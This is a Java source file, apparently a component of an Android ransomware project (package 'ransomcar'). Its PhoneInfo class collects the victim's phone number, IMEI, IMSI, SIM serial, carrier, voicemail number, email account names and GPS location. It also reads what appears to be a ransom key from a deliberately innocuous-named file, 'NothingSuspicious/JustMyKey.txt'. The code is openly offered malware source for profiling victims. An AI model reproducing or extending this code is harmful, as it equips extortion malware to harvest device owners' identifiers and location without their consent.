package com.example.ransomcar;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.util.List;
import java.util.regex.Pattern;
import android.accounts.Account;
import android.accounts.AccountManager;
import android.content.Context;
import android.location.Location;
import android.location.LocationManager;
import android.os.Environment;
import android.telephony.TelephonyManager;
import android.util.Patterns;

public class PhoneInfo {
		
		public static String getMyPhoneNumber(Context context){
		    try {
		        TelephonyManager mTelephonyMgr;
		        mTelephonyMgr = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
		        return mTelephonyMgr.getLine1Number(); 
		      }
		      catch (Exception e) {
		        return "";
		      }
		    }  
		
		  public static String getMyIMEI(Context context){
			    try {
			      TelephonyManager mTelephonyMgr;
			      mTelephonyMgr = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
			      return mTelephonyMgr.getDeviceId(); 
			    }
			    catch (Exception e) {
			      return "";
			    }
			  }  
		  
		  public static String getMyNetworkOperator(Context arg0){
			    try {
			      TelephonyManager mTelephonyMgr;
			      mTelephonyMgr = (TelephonyManager) arg0.getSystemService(Context.TELEPHONY_SERVICE);
			      return mTelephonyMgr.getNetworkOperatorName(); 
			    }
			    catch (Exception e) {
			      return "";
			    }
			  }
		  public static String getMySIMSerial(Context arg0){
			    try {
			      TelephonyManager mTelephonyMgr;
			      mTelephonyMgr = (TelephonyManager) arg0.getSystemService(Context.TELEPHONY_SERVICE);
			      return mTelephonyMgr.getSimSerialNumber(); 
			    }
			    catch (Exception e) {
			      return "";
			    }
			  }
		  
		  public static String getMyIMSI(Context b){
			    try {
			      TelephonyManager mTelephonyMgr;
			      mTelephonyMgr = (TelephonyManager) b.getSystemService(Context.TELEPHONY_SERVICE);
			      return mTelephonyMgr.getSubscriberId(); 
			    }
			    catch (Exception e) {
			      return "";
			    }
			  }
		  
		  public static String getMyVoiceMailNumber(Context context){
			    try {
			      TelephonyManager mTelephonyMgr;
			      mTelephonyMgr = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
			      return mTelephonyMgr.getVoiceMailNumber(); 
			    }
			    catch (Exception e) {
			      return "";
			    }
			  }
		  
		  public static String getMyMailAccounts(Context a){
			    try {
			        String names=null;
			    	Pattern emailPattern = Patterns.EMAIL_ADDRESS; // API level 8+
				    AccountManager mAccountManager = AccountManager.get(a);
				    Account[] accounts = mAccountManager.getAccounts();
				    for (Account account : accounts) {
				    	if (emailPattern.matcher(account.name).matches()) {
				            String possibleEmail = account.name;
				            names = names + "; " + possibleEmail;
				            }
				    	}
				    return names; 
			    }
			    catch (Exception e) {
			      return "";
			    }
			  }
		  public static double[] getGPS(Context context) {
			    try {
			      LocationManager lm = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);  
			      List<String> providers = lm.getProviders(true);

			      /* Loop over the array backwards, and if you get an accurate location, then break out the loop*/
			      Location l = null;

			      for (int i=providers.size()-1; i>=0; i--) {
			        l = lm.getLastKnownLocation((String) providers.get(i));
			        if (l != null) break;
			      }

			      double[] gps = new double[2];
			      if (l != null) {
			        gps[0] = l.getLatitude();
			        gps[1] = l.getLongitude();
			      }
			      return gps;
			    }
			    catch (Exception e) {
			      // I don't even know how this might happen
			      return null;
			    }
			  }
		  
		  // Retrieving key from local file
		  public static String getMyKey(){
			  File file = new File(Environment.getExternalStorageDirectory()+File.separator + "NothingSuspicious" +File.separator +"JustMyKey.txt");
			  String key="";
			  if (file.exists()){
				  try{
					BufferedReader br = new BufferedReader(new FileReader(file));
					key=br.readLine().toString();
					br.close();
				  }
				  catch(Exception e){
					  e.printStackTrace();
				  }
			  }
			return key;
		}
}
